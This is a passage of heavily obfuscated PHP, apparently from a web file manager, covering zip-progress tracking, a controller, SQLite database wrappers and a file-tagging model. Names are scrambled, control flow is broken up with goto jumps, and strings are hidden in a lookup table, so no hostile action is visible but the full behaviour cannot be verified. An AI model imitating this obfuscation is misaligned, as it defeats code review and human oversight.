$CôÊÍññçó[$cë¡‘ßÔ¬‚[1013]] += 1; $CôÊÍññçó[$cë¡‘ßÔ¬‚[999]] += 1; } $CôÊÍññçó[$cë¡‘ßÔ¬‚[1547]] = $eÒŠ½„’¥ô; goto aËêÈšïç•; B¹¸‚…Ó°: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Fä™ğ”•©Ò =& $_SERVER[µ…]; parent::startAfter(); Hook::bind($Fä™ğ”•©Ò[1593], array($this, $Fä™ğ”•©Ò[1588])); $b´ğÓëÚßİ =& $this->task; $b´ğÓëÚßİ[$Fä™ğ”•©Ò[1590]] = $Fä™ğ”•©Ò[1071]; if (!$b´ğÓëÚßİ[$Fä™ğ”•©Ò[1411]]) { $b´ğÓëÚßİ[$Fä™ğ”•©Ò[1411]] = LNG($Fä™ğ”•©Ò[1594]); } } protected function endAfter() { $FÁ±“å¹‘– =& $_SERVER[µ…]; parent::endAfter(); Hook::unbind($FÁ±“å¹‘–[1593], array($this, $FÁ±“å¹‘–[1588])); } public function updateAfter() { $AŒÍóâñĞŠ =& $_SERVER[µ…]; $cö“»¦‚ =& $this->task; if (!$cö“»¦‚[$AŒÍóâñĞŠ[999]] || !$cö“»¦‚[$AŒÍóâñĞŠ[713]]) { return; } if ($cö“»¦‚[$AŒÍóâñĞŠ[1590]] == $AŒÍóâñĞŠ[1071]) { $a¶÷…È«ê‚ = $cö“»¦‚[$AŒÍóâñĞŠ[1550]]; if ($cö“»¦‚[$AŒÍóâñĞŠ[1551]] != $AŒÍóâñĞŠ[1071]) { $a¶÷…È«ê‚ = 0; } $fÀêÄ©¯ ‹ = ($cö“»¦‚[$AŒÍóâñĞŠ[1554]] + $a¶÷…È«ê‚) / $cö“»¦‚[$AŒÍóâñĞŠ[713]]; $cö“»¦‚[$AŒÍóâñĞŠ[1507]] = $fÀêÄ©¯ ‹ * 0.3; } else { if ($cö“»¦‚[$AŒÍóâñĞŠ[1590]] == $AŒÍóâñĞŠ[309]) { $fÀêÄ©¯ ‹ = $cö“»¦‚[$AŒÍóâñĞŠ[1013]] / $cö“»¦‚[$AŒÍóâñĞŠ[999]]; $cö“»¦‚[$AŒÍóâñĞŠ[1507]] = 0.3 + $fÀêÄ©¯ ‹ * 0.5; } else { if ($cö“»¦‚[$AŒÍóâñĞŠ[1590]] == $AŒÍóâñĞŠ[106]) { $fÀêÄ©¯ ‹ = 0; if ($cö“»¦‚[$AŒÍóâñĞŠ[1549]]) { $fÀêÄ©¯ ‹ = $cö“»¦‚[$AŒÍóâñĞŠ[1550]] / $cö“»¦‚[$AŒÍóâñĞŠ[1549]]; } $cö“»¦‚[$AŒÍóâñĞŠ[1507]] = 0.3 + 0.5 + $fÀêÄ©¯ ‹ * 0.2; } } } if ($cö“»¦‚[$AŒÍóâñĞŠ[1507]] > 0) { $Cª²¹«–” = timeFloat() - $cö“»¦‚[$AŒÍóâñĞŠ[735]] - $cö“»¦‚[$AŒÍóâñĞŠ[1510]]; $cö“»¦‚[$AŒÍóâñĞŠ[1511]] = $Cª²¹«–” * (1 - $cö“»¦‚[$AŒÍóâñĞŠ[1507]]) / $cö“»¦‚[$AŒÍóâñĞŠ[1507]]; } } public function copyFileStart($EÕèòó†ì, $Bï¬ïÉ¡Ü¯, $F·ä¼£ß¹, $FàçàÍ»Å, $f ®ƒ¸¨ó, $B£†¢ºëôº) { $dÊÚåï¦Ë =& $_SERVER[µ…]; parent::copyFileStart($EÕèòó†ì, $Bï¬ïÉ¡Ü¯, $F·ä¼£ß¹, $FàçàÍ»Å, $f ®ƒ¸¨ó, $B£†¢ºëôº); $cÁ»İƒ—Ï‡ =& $this->task; if ($cÁ»İƒ—Ï‡[$dÊÚåï¦Ë[1590]] == $dÊÚåï¦Ë[309]) { $cÁ»İƒ—Ï‡[$dÊÚåï¦Ë[1590]] = $dÊÚåï¦Ë[106]; } $this->update(); } public function copyFileEnd($BÏò†Õ½Œ©, $d‰Ëë‚¿¸ë, $e…âßøÉˆª, $CÚŒ­ÌÎ«Å, $cÛ†‰÷ôÌ, $B­®²œØöÕ) { $CÊ†ñ”‚“ö =& $_SERVER[µ…]; $f´ŒªÁŠ»ï =& $this->task; $f´ŒªÁŠ»ï[$CÊ†ñ”‚“ö[1550]] = $f´ŒªÁŠ»ï[$CÊ†ñ”‚“ö[1549]]; $f´ŒªÁŠ»ï[$CÊ†ñ”‚“ö[1554]] += $f´ŒªÁŠ»ï[$CÊ†ñ”‚“ö[1549]]; $f´ŒªÁŠ»ï[$CÊ†ñ”‚“ö[1551]] = $CÊ†ñ”‚“ö[33]; $this->update(); } public function nameParse($c¼˜ğá¨‡‹) { $B¼§÷„ÜŠá =& $_SERVER[µ…]; $C”‰‚âîŸ =& $this->task; if ($C”‰‚âîŸ[$B¼§÷„ÜŠá[1013]] < $C”‰‚âîŸ[$B¼§÷„ÜŠá[999]]) { $AššÎõºì = get_path_this($c¼˜ğá¨‡‹); if (strstr($AššÎõºì, $B¼§÷„ÜŠá[94])) { $C”‰‚âîŸ[$B¼§÷„ÜŠá[1013]] += 1; } } if ($C”‰‚âîŸ[$B¼§÷„ÜŠá[1590]] == $B¼§÷„ÜŠá[1071]) { $C”‰‚âîŸ[$B¼§÷„ÜŠá[1590]] = $B¼§÷„ÜŠá[309]; } $C”‰‚âîŸ[$B¼§÷„ÜŠá[1547]] = $c¼˜ğá¨‡‹; $this->update(); } } goto AšÄ‹»‹ï¬; båÒ¤È¿ì£: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto FŞô¢‡·Ì†; FŞô¢‡·Ì†: $e¤êä¦ã‡° =& $_SERVER[µ…]; global $in, $config; $this->config =& $config; goto e÷˜´çÚõÕ; e÷˜´çÚõÕ: $this->in =& $in; $this->values[$e¤êä¦ã‡°[6]] =& $config; $this->values[$e¤êä¦ã‡°[7]] =& $in; goto e«‹¤„”‰; e«‹¤„”‰: $this->tpl = TEMPLATE . MOD . $e¤êä¦ã‡°[8]; $this->_classObjectID = mt_rand(0, 10000); goto e¡‚ğ†ã¦Œ; e¡‚ğ†ã¦Œ: } public function loadClass($cÛ™‘î‡–) { if (1 === func_num_args()) { $this->{$cÛ™‘î‡–} = new $cÛ™‘î‡–(); } else { $a÷ˆÅøŠÒã = new ReflectionClass($cÛ™‘î‡–); $Fº†¹¦— = func_get_args(); array_shift($Fº†¹¦—); $this->{$cÛ™‘î‡–} = $a÷ˆÅøŠÒã->newInstanceArgs($Fº†¹¦—); } return $this->{$cÛ™‘î‡–}; } protected function assign($fËŠ¯£éÛ, $A†ÔŠæº™³) { $this->values[$fËŠ¯£éÛ] = $A†ÔŠæº™³; } protected function display($Dˆˆ°ğ”Ã) { ob_end_clean(); extract($this->values); require $this->tpl . $Dˆˆ°ğ”Ã; } } class DbSqliteBase extends Db { public function __construct($e‚•ÓğÇÛó = '') { $aÌİËÜˆÇİ =& $_SERVER[µ…]; if (!extension_loaded($aÌİËÜˆÇİ[9])) { think_exception(think_lang($aÌİËÜˆÇİ[10]) . $aÌİËÜˆÇİ[11]); } if (!empty($e‚•ÓğÇÛó)) { if (!isset($e‚•ÓğÇÛó[$aÌİËÜˆÇİ[12]])) { $e‚•ÓğÇÛó[$aÌİËÜˆÇİ[12]] = 438; } $this->config = $e‚•ÓğÇÛó; if (empty($this->config[$aÌİËÜˆÇİ[13]])) { $this->config[$aÌİËÜˆÇİ[13]] = array(); } } } public function connect($Fµñò„‡â = '', $AãæŸ¥ê‰£ = 0) { $CÙáÔÌºğë =& $_SERVER[µ…]; if (!isset($this->linkID[$AãæŸ¥ê‰£])) { goto dÇæ¶Â¹å; AĞåêœ…: $this->linkID[$AãæŸ¥ê‰£] = $E™¸°Ú½×($Fµñò„‡â[$CÙáÔÌºğë[17]], $Fµñò„‡â[$CÙáÔÌºğë[12]]); if (!$this->linkID[$AãæŸ¥ê‰£]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto F—ÅÎØº; F—ÅÎØº: @sqlite_busy_timeout($this->linkID[$AãæŸ¥ê‰£], 30000); if (1 != think_config($CÙáÔÌºğë[18])) { unset($this->config); } goto c†Ğ¼¤“¯ò; dÇæ¶Â¹å: if (empty($Fµñò„‡â)) { $Fµñò„‡â = $this->config; } $E‡”Í¿ÔÂ = !empty($Fµñò„‡â[$CÙáÔÌºğë[13]][$CÙáÔÌºğë[14]]) ? $Fµñò„‡â[$CÙáÔÌºğë[13]][$CÙáÔÌºğë[14]] : $this->pconnect; $E™¸°Ú½× = $E‡”Í¿ÔÂ ? $CÙáÔÌºğë[15] : $CÙáÔÌºğë[16]; goto AĞåêœ…; c†Ğ¼¤“¯ò: } return $this->linkID[$AãæŸ¥ê‰£]; } public function free() { $this->queryID = null; } public function query($dëğ†ôŒÀŸ) { goto CÅò‚¯«Ò¸; F¼ìÏğ¬¸: think_status($c¦ªÜ¼Æö[20]); $this->queryID = sqlite_query($this->_linkID, $dëğ†ôŒÀŸ); $this->debug(); goto fÏ‘Àãßä; e¸Ä‰§¾Î¹: $this->queryStr = $dëğ†ôŒÀŸ; if ($this->queryID) { $this->free(); } think_action_status($c¦ªÜ¼Æö[19], 1); goto F¼ìÏğ¬¸; CÅò‚¯«Ò¸: $c¦ªÜ¼Æö =& $_SERVER[µ…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e¸Ä‰§¾Î¹; fÏ‘Àãßä: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $D‹Œ×ğ¤Û = $this->getAll(); return $D‹Œ×ğ¤Û; } goto d­æÑ°«ï…; d­æÑ°«ï…: } public function execute($a÷•ˆÜ¹åù) { goto F„ñàƒ¯£; f²¹„æÄåô: think_status($fÛ£»ƒ¾Ç[20]); $DšøËÓòŠÔ = sqlite_exec($this->_linkID, $a÷•ˆÜ¹åù); $this->debug(); goto f“¿ªŒãé´; F„ñàƒ¯£: $fÛ£»ƒ¾Ç =& $_SERVER[µ…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Föì›‚í†; Föì›‚í†: $this->queryStr = $a÷•ˆÜ¹åù; if ($this->queryID) { $this->free(); } think_action_status($fÛ£»ƒ¾Ç[21], 1); goto f²¹„æÄåô; f“¿ªŒãé´: if (!1 === $DšøËÓòŠÔ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto fä½˜ŞŞİô; fä½˜ŞŞİô: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[µ…][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÓëáéì‚ã = sqlite_query($this->_linkID, $_SERVER[µ…][23]); if (!$AÓëáéì‚ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b¾èŞ‘œ» = sqlite_query($this->_linkID, $_SERVER[µ…][24]); if (!$b¾èŞ‘œ») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cØ³¦ÏÊËá = array(); if ($this->numRows > 0) { for ($BŒ³ÖîÄù = 0; $BŒ³ÖîÄù < $this->numRows; $BŒ³ÖîÄù++) { $cØ³¦ÏÊËá[$BŒ³ÖîÄù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $cØ³¦ÏÊËá; } public function getFields($A„”‘µÏ¸…) { $cÁ²¡Úƒ‹ =& $_SERVER[µ…]; $D“éİÁÜ£Š = $this->query($cÁ²¡Úƒ‹[25] . $A„”‘µÏ¸… . $cÁ²¡Úƒ‹[26]); $fÖ¨µ¢‡®Ç = array(); if ($D“éİÁÜ£Š) { foreach ($D“éİÁÜ£Š as $Fˆé–îÏÅ => $d®­”ËæÖä) { $fÖ¨µ¢‡®Ç[$d®­”ËæÖä[$cÁ²¡Úƒ‹[27]]] = array($cÁ²¡Úƒ‹[28] => $d®­”ËæÖä[$cÁ²¡Úƒ‹[27]], $cÁ²¡Úƒ‹[29] => $d®­”ËæÖä[$cÁ²¡Úƒ‹[30]], $cÁ²¡Úƒ‹[31] => (bool) ($d®­”ËæÖä[$cÁ²¡Úƒ‹[32]] === $cÁ²¡Úƒ‹[33]), $cÁ²¡Úƒ‹[34] => $d®­”ËæÖä[$cÁ²¡Úƒ‹[35]], $cÁ²¡Úƒ‹[36] => strtolower($d®­”ËæÖä[$cÁ²¡Úƒ‹[37]]) == $cÁ²¡Úƒ‹[38], $cÁ²¡Úƒ‹[39] => strtolower($d®­”ËæÖä[$cÁ²¡Úƒ‹[40]]) == $cÁ²¡Úƒ‹[41]); } } return $fÖ¨µ¢‡®Ç; } public function getTables($C‚ÛÈå–¸‚ = '') { $Fø“»÷ñ¦ =& $_SERVER[µ…]; $DËœé”ğ  = $this->query($Fø“»÷ñ¦[42] . $Fø“»÷ñ¦[43] . $Fø“»÷ñ¦[44]); $c¡†×ƒ†‘Ø = array(); foreach ($DËœé”ğ  as $F†±œ™­Š => $b½Ó‘³Šíã) { $c¡†×ƒ†‘Ø[$F†±œ™­Š] = current($b½Ó‘³Šíã); } return $c¡†×ƒ†‘Ø; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $dÖë¿²£Ü =& $_SERVER[µ…]; $DàÙ«£õä´ = sqlite_last_error($this->_linkID); $this->error = $DàÙ«£õä´ . $dÖë¿²£Ü[4] . sqlite_error_string($DàÙ«£õä´); if ($dÖë¿²£Ü[33] != $this->queryStr) { $this->error .= LNG($dÖë¿²£Ü[45]) . $this->queryStr; } think_trace($this->error, $dÖë¿²£Ü[33], $dÖë¿²£Ü[46]); return $this->error; } public function escapeString($D¦‘¸‰¤„Ş) { return sqlite_escape_string($D¦‘¸‰¤„Ş); } public function parseLimit($BÑêá÷´´) { $cªõ®×Ö·• =& $_SERVER[µ…]; $Bù³‘ìö¼± = $cªõ®×Ö·•[33]; if (!empty($BÑêá÷´´)) { $BÑêá÷´´ = explode($cªõ®×Ö·•[47], $BÑêá÷´´); if (count($BÑêá÷´´) > 1) { $Bù³‘ìö¼± .= $cªõ®×Ö·•[48] . $BÑêá÷´´[1] . $cªõ®×Ö·•[49] . $BÑêá÷´´[0] . $cªõ®×Ö·•[50]; } else { $Bù³‘ìö¼± .= $cªõ®×Ö·•[48] . $BÑêá÷´´[0] . $cªõ®×Ö·•[50]; } } return $Bù³‘ìö¼±; } } class DbSqlite3Base extends Db { public function __construct($F¾Æ÷š× = '') { $f¨‘Æ•Û =& $_SERVER[µ…]; if (!class_exists($f¨‘Æ•Û[51])) { think_exception(think_lang($f¨‘Æ•Û[10]) . $f¨‘Æ•Û[52]); } if (!empty($F¾Æ÷š×)) { if (!isset($F¾Æ÷š×[$f¨‘Æ•Û[12]])) { $F¾Æ÷š×[$f¨‘Æ•Û[12]] = 438; } $this->config = $F¾Æ÷š×; if (empty($this->config[$f¨‘Æ•Û[13]])) { $this->config[$f¨‘Æ•Û[13]] = array(); } } } public function connect($cê®„÷Ğ‰ = '', $bÆğâÍˆŠ = 0) { $Fì°¥ùáù« =& $_SERVER[µ…]; if (!isset($this->linkID[$bÆğâÍˆŠ])) { if (empty($cê®„÷Ğ‰)) { $cê®„÷Ğ‰ = $this->config; } $this->linkID[$bÆğâÍˆŠ] = new SQLite3($cê®„÷Ğ‰[$Fì°¥ùáù«[17]]); if (!$this->linkID[$bÆğâÍˆŠ]) { think_exception($this->linkID[$bÆğâÍˆŠ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$bÆğâÍˆŠ]->busyTimeout(30000); if (1 != think_config($Fì°¥ùáù«[18])) { unset($this->config); } } return $this->linkID[$bÆğâÍˆŠ]; } public function free() { $this->queryID = null; } public function query($fÀ‡šâÛÈª) { goto fš¦Ñ‘²¡; fš¦Ñ‘²¡: $EÄÂ÷Ó˜³ =& $_SERVER[µ…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¤Œğî¢”; B¤Œğî¢”: $this->queryStr = $fÀ‡šâÛÈª; if ($this->queryID) { $this->free(); } think_action_status($EÄÂ÷Ó˜³[19], 1); goto A‹ß£äáİ; A‹ß£äáİ: think_status($EÄÂ÷Ó˜³[20]); $this->queryID = $this->_linkID->query($fÀ‡šâÛÈª); $this->debug(); goto eä¤î³Ÿà•; eä¤î³Ÿà•: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f…²ãµ…Û· = $this->getAll(); $this->numRows = count($f…²ãµ…Û·); return $f…²ãµ…Û·; } goto CË÷¡…Ò±; CË÷¡…Ò±: } public function execute($bÂÑ‘¨¢Â«) { goto a†åè¾ãíé; B®ĞØÖ®Ñó: think_status($eÜßö¨¤šÕ[20]); $Cßôà®¯‘œ = $this->_linkID->exec($bÂÑ‘¨¢Â«); $this->debug(); goto bÚĞ§¶Öª™; a†åè¾ãíé: $eÜßö¨¤šÕ =& $_SERVER[µ…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÀ›Ü–ˆÎ‰; aÀ›Ü–ˆÎ‰: $this->queryStr = $bÂÑ‘¨¢Â«; if ($this->queryID) { $this->free(); } think_action_status($eÜßö¨¤šÕ[21], 1); goto B®ĞØÖ®Ñó; bÚĞ§¶Öª™: if (!1 === $Cßôà®¯‘œ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eæ±Œª²â; eæ±Œª²â: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[µ…][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a•ÜÅ¡‘²Š = $this->_linkID->query($_SERVER[µ…][23]); if (!$a•ÜÅ¡‘²Š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A‡¦öÑàù = $this->_linkID->query($_SERVER[µ…][24]); if (!$A‡¦öÑàù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $EˆØõª = array(); while ($Dì¬¥Ö¥ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $EˆØõª[] = $Dì¬¥Ö¥; } $this->queryID->reset(); return $EˆØõª; } public function getFields($e¥ÌĞ›æÒš) { $Dâ÷Ó—‚ =& $_SERVER[µ…]; $Cˆ‹Ì¨ì = $this->query($Dâ÷Ó—‚[25] . $e¥ÌĞ›æÒš . $Dâ÷Ó—‚[26]); $fåîšò¼ƒ = array(); if ($Cˆ‹Ì¨ì) { foreach ($Cˆ‹Ì¨ì as $fˆ­ÏÓÜá¿ => $eò»‰›ÉÍÄ) { $fåîšò¼ƒ[$eò»‰›ÉÍÄ[$Dâ÷Ó—‚[28]]] = array($Dâ÷Ó—‚[28] => $eò»‰›ÉÍÄ[$Dâ÷Ó—‚[28]], $Dâ÷Ó—‚[29] => $eò»‰›ÉÍÄ[$Dâ÷Ó—‚[29]], $Dâ÷Ó—‚[31] => (bool) ($eò»‰›ÉÍÄ[$Dâ÷Ó—‚[31]] === $Dâ÷Ó—‚[33]), $Dâ÷Ó—‚[34] => $eò»‰›ÉÍÄ[$Dâ÷Ó—‚[53]], $Dâ÷Ó—‚[36] => (bool) $eò»‰›ÉÍÄ[$Dâ÷Ó—‚[54]], $Dâ÷Ó—‚[39] => (bool) $eò»‰›ÉÍÄ[$Dâ÷Ó—‚[54]]); } } return $fåîšò¼ƒ; } public function getTables($DÛĞ®•¤›š = '') { $dšˆªè¬ì =& $_SERVER[µ…]; $dˆš¶ Ö‘• = $this->query($dšˆªè¬ì[42] . $dšˆªè¬ì[43] . $dšˆªè¬ì[44]); $e¡ÕÅ¸ÆÅ‡ = array(); foreach ($dˆš¶ Ö‘• as $E°§•ÏŒ»µ => $AÕ’×ÙŒ») { $e¡ÕÅ¸ÆÅ‡[$E°§•ÏŒ»µ] = current($AÕ’×ÙŒ»); } return $e¡ÕÅ¸ÆÅ‡; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FŞÊä¸Õà =& $_SERVER[µ…]; $this->error = $this->_linkID->lastErrorMsg(); if ($FŞÊä¸Õà[33] != $this->queryStr) { $this->error .= LNG($FŞÊä¸Õà[45]) . $this->queryStr; } think_trace($this->error, $FŞÊä¸Õà[33], $FŞÊä¸Õà[46]); return $this->error; } public function escapeString($fğÆ­›¿) { $B•”„µ©º =& $_SERVER[µ…]; if ($this->_linkID) { return $this->_linkID->escapeString($fğÆ­›¿); } return str_ireplace($B•”„µ©º[55], $B•”„µ©º[56], $fğÆ­›¿); } public function parseLimit($EÃÏê„Ö) { $AºÁõ•ê·Î =& $_SERVER[µ…]; $A«¼µ‡ÀªÂ = $AºÁõ•ê·Î[33]; if (!empty($EÃÏê„Ö)) { $EÃÏê„Ö = explode($AºÁõ•ê·Î[47], $EÃÏê„Ö); if (count($EÃÏê„Ö) > 1) { $A«¼µ‡ÀªÂ .= $AºÁõ•ê·Î[48] . $EÃÏê„Ö[1] . $AºÁõ•ê·Î[49] . $EÃÏê„Ö[0] . $AºÁõ•ê·Î[50]; } else { $A«¼µ‡ÀªÂ .= $AºÁõ•ê·Î[48] . $EÃÏê„Ö[0] . $AºÁõ•ê·Î[50]; } } return $A«¼µ‡ÀªÂ; } } goto CÎé¸Ş¼Î; dÆÅå¢’«: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($f¼»‹ÌÍ¼†) { $aÊŸ¯¢¡™ï =& $_SERVER[µ…]; return array($aÊŸ¯¢¡™ï[1770] => array($f¼»‹ÌÍ¼†[0], $aÊŸ¯¢¡™ï[1771]), $aÊŸ¯¢¡™ï[1772] => array($f¼»‹ÌÍ¼†[0], $aÊŸ¯¢¡™ï[1773])); } protected function get($eìê§Ç¿ö¡) { $aÊŸ«»½™ñ =& $_SERVER[µ…]; $Bá¤„èÅÃ = Model($aÊŸ«»½™ñ[480])->metaGet($eìê§Ç¿ö¡, $aÊŸ«»½™ñ[1774]); $dî‚‰•‰ÜÖ = json_decode($Bá¤„èÅÃ, !0); return $dî‚‰•‰ÜÖ ? $dî‚‰•‰ÜÖ : array($aÊŸ«»½™ñ[1775] => $aÊŸ«»½™ñ[86], $aÊŸ«»½™ñ[365] => array()); } protected function set($Dƒ‹Æ†Óê–, $dÒ—öôš£ ) { $d†ß›öä§æ =& $_SERVER[µ…]; $dÒ—öôš£  = $dÒ—öôš£  ? $dÒ—öôš£  : array($d†ß›öä§æ[1775] => $d†ß›öä§æ[86], $d†ß›öä§æ[365] => array()); Model($d†ß›öä§æ[480])->metaSet($Dƒ‹Æ†Óê–, $d†ß›öä§æ[1774], json_encode($dÒ—öôš£ )); return Model($d†ß›öä§æ[480])->metaSet($Dƒ‹Æ†Óê–, $d†ß›öä§æ[1774], json_encode($dÒ—öôš£ )); } protected function getByTagID($cšê¯¢¸ôÕ, $EÃìë·³‡) { goto DöÀñİí Ö; DöÀñİí Ö: $bâØñÌµîò =& $_SERVER[µ…]; if (!$cšê¯¢¸ôÕ || !$EÃìë·³‡) { return !1; } if (!Model($bâØñÌµîò[480])->getInfoSimple($cšê¯¢¸ôÕ)) { return !1; } goto Eë‰ìîÏ…; fâğÄ©·: return is_array($Dî“œ·¢ØÉ) ? $Dî“œ·¢ØÉ : !1; goto B†¬å¼Ô©; Eë‰ìîÏ…: $E³ÃÎïÉ˜Ã = $this->get($cšê¯¢¸ôÕ); if (!$E³ÃÎïÉ˜Ã || !isset($E³ÃÎïÉ˜Ã[$bâØñÌµîò[365]])) { return !1; } $Dî“œ·¢ØÉ = array_find_by_field($E³ÃÎïÉ˜Ã[$bâØñÌµîò[365]], $bâØñÌµîò[388], $EÃìë·³‡); goto fâğÄ©·; B†¬å¼Ô©: } public function listSource($dÕŒÌ›½‡Ø, $DÀÅæ¸Öê) { goto f¾¦®¦ºÇã; C¢¦Ó‡ºù®: $d§£­İ“Üè = array_to_keyvalue($bŠÌ ‚ËÑ[$E‰®¦è‘ØÌ[73]], $E‰®¦è‘ØÌ[33], $E‰®¦è‘ØÌ[390]); $f‘éåäö = array_merge($d§£­İ“Üè, $C°ëäãÉ›†); foreach ($cö‹ò¯± as $d·‡™®ÊŞ) { if (!in_array($d·‡™®ÊŞ, $f‘éåäö)) { $a¿„Î‚¸‰°[] = $d·‡™®ÊŞ; } } goto aˆ«ˆÉ é¯; BìÖÉ™Šë„: if (!$bŠÌ ‚ËÑ || count($cö‹ò¯±) == $bŠÌ ‚ËÑ[$E‰®¦è‘ØÌ[362]][$E‰®¦è‘ØÌ[363]]) { return $bŠÌ ‚ËÑ; } $a¿„Î‚¸‰° = array(); $C°ëäãÉ›† = array_to_keyvalue($bŠÌ ‚ËÑ[$E‰®¦è‘ØÌ[74]], $E‰®¦è‘ØÌ[33], $E‰®¦è‘ØÌ[390]); goto C¢¦Ó‡ºù®; aõÛ¾ºÔß±: $a¾ÛËÄ¶º = array(); foreach ($B„œñä¡¸§ as $b¬›ËÏ©ø£) { $d·‡™®ÊŞ = $b¬›ËÏ©ø£[$E‰®¦è‘ØÌ[75]]; if (!$d·‡™®ÊŞ) { continue; } if (!isset($a¾ÛËÄ¶º[$d·‡™®ÊŞ])) { $a¾ÛËÄ¶º[$d·‡™®ÊŞ] = array(); } $a¾ÛËÄ¶º[$d·‡™®ÊŞ][] = $b¬›ËÏ©ø£[$E‰®¦è‘ØÌ[413]]; } $cö‹ò¯± = array(); goto DöÎêí»ÌÇ; DöÎêí»ÌÇ: foreach ($a¾ÛËÄ¶º as $a¤µâŒ†²Ğ => $CØ¥šµÈ†) { $eœÛ‰Š²Ğ± = !0; if (!$DÀÅæ¸Öê) { $cö‹ò¯±[] = $a¤µâŒ†²Ğ; continue; } foreach ($DÀÅæ¸Öê as $c×Š¤Ì¬ø ) { if (!in_array($c×Š¤Ì¬ø , $CØ¥šµÈ†)) { $eœÛ‰Š²Ğ± = !1; break; } } if ($eœÛ‰Š²Ğ±) { $cö‹ò¯±[] = $a¤µâŒ†²Ğ; } } if (!$cö‹ò¯±) { return array(); } $bŠÌ ‚ËÑ = Model($E‰®¦è‘ØÌ[1181])->listSource(array($E‰®¦è‘ØÌ[404] => array($E‰®¦è‘ØÌ[405], $cö‹ò¯±))); goto BìÖÉ™Šë„; f¾¦®¦ºÇã: $E‰®¦è‘ØÌ =& $_SERVER[µ…]; if ($DÀÅæ¸Öê && !is_array($DÀÅæ¸Öê)) { $DÀÅæ¸Öê = array($DÀÅæ¸Öê); } $B„œñä¡¸§ = $this->listData($dÕŒÌ›½‡Ø); goto aõÛ¾ºÔß±; aˆ«ˆÉ é¯: if ($a¿„Î‚¸‰°) { $this->removeBySource($dÕŒÌ›½‡Ø, $a¿„Î‚¸‰°); } return $bŠÌ ‚ËÑ; goto F›ª©ù±º; F›ª©ù±º: } protected function listData($aˆÒçš½¸) { $C¥…¥Í„É‘ =& $_SERVER[µ…]; $Bñùº¸ò† = array($C¥…¥Í„É‘[1498] => 0, $C¥…¥Í„É‘[457] => array($C¥…¥Í„É‘[1776], 0), $C¥…¥Í„É‘[409] => $C¥…¥Í„É‘[1777] . $aˆÒçš½¸); $FË„Ğ ĞØ = $C¥…¥Í„É‘[1778]; $c ˜­ÇÇ¿¾ = $this->field($FË„Ğ ĞØ)->where($Bñùº¸ò†)->order($C¥…¥Í„É‘[1779])->select(); return $c ˜­ÇÇ¿¾ ? $c ˜­ÇÇ¿¾ : array(); } protected function addToTag($C¿­¨Éøä, $bäó×äÍØÒ, $Dë²›£Õ‹) { $c‡Õ„ÓĞÙÍ =& $_SERVER[µ…]; if (!$this->getByTagID($C¿­¨Éøä, $Dë²›£Õ‹) || !$bäó×äÍØÒ) { return !1; } if (!Model($c‡Õ„ÓĞÙÍ[769])->pathInfo($bäó×äÍØÒ)) { return !1; } $Aøñ±Ñ¼² = array($c‡Õ„ÓĞÙÍ[1498] => 0, $c‡Õ„ÓĞÙÍ[457] => $Dë²›£Õ‹, $c‡Õ„ÓĞÙÍ[408] => $bäó×äÍØÒ, $c‡Õ„ÓĞÙÍ[409] => $c‡Õ„ÓĞÙÍ[1780] . $C¿­¨Éøä, $c‡Õ„ÓĞÙÍ[407] => $c‡Õ„ÓĞÙÍ[33], $c‡Õ„ÓĞÙÍ[1673] => 0); if ($this->where($Aøñ±Ñ¼²)->find()) { return !1; } return $this->add($Aøñ±Ñ¼²); } protected function removeFromTag($F‡ğ‰ôÎêÔ, $F„¥‰Ó­Èä, $f„«ÎÛîÙÇ) { $AÊÔÌµ†ÖË =& $_SERVER[µ…]; if (!$this->getByTagID($F‡ğ‰ôÎêÔ, $f„«ÎÛîÙÇ) || !$F„¥‰Ó­Èä) { return !1; } if (is_array($F„¥‰Ó­Èä)) { $F„¥‰Ó­Èä = array($AÊÔÌµ†ÖË[7], $F„¥‰Ó­Èä); } $cÃšÙºŞğ° = array($AÊÔÌµ†ÖË[1498] => 0, $AÊÔÌµ†ÖË[457] => $f„«ÎÛîÙÇ, $AÊÔÌµ†ÖË[409] => $AÊÔÌµ†ÖË[1780] . $F‡ğ‰ôÎêÔ, $AÊÔÌµ†ÖË[408] => $F„¥‰Ó­Èä); return $this->where($cÃšÙºŞğ°)->delete(); } protected function removeByTag($f„†°Üğé», $D²°–İ©êŞ) { $cöóÎÔÔ” =& $_SERVER[µ…]; if (!$this->getByTagID($f„†°Üğé», $D²°–İ©êŞ)) { return !1; } $BÆÅŠ¿Í¨© = array($cöóÎÔÔ”[1498] => 0, $cöóÎÔÔ”[457] => $D²°–İ©êŞ, 